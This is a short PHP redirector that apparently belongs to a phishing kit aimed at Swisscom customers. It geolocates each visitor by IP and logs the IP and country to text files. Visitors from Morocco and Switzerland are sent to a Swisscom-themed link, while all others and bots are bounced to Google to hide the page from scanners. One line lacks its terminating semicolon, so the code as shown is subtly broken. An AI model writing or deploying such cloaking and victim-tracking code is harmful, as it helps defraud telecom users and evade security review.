<?php
date_default_timezone_set('GMT');
//-------------------------- COUNTRIES
$allowed = array('MA','CH');
//--------------------------
include'./hk-CN/send/function.php';
$link = 'https://neighborhoodtelco.com/coverage/Connections/ikhanes/swiss?pwd=swisscom'
$J7 = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$ip");
$country = $J7->geoplugin_countryName ; 
$country_code = $J7->geoplugin_countryCode ; 
//-------------------------------------- BOT CHECK ROBOTS
include'./security/bot.php';
//-------------------------------------- BOT CHECK COUNTRY
if(!in_array($country_code, $allowed)){
$data = 'Ok : '.$country.' / ('.$TIME_DATE.') |IP : '.$ip;
file_put_contents('./s/Bakayooorat.txt', $data.PHP_EOL, FILE_APPEND);
header('Location: https://google.com');
}else{
$data = 'Audience : '.$country.' / ('.$TIME_DATE.') |IP : '.$ip;
file_put_contents('./s/Audience.txt', $data.PHP_EOL, FILE_APPEND);
header("Location: $link");
}
?>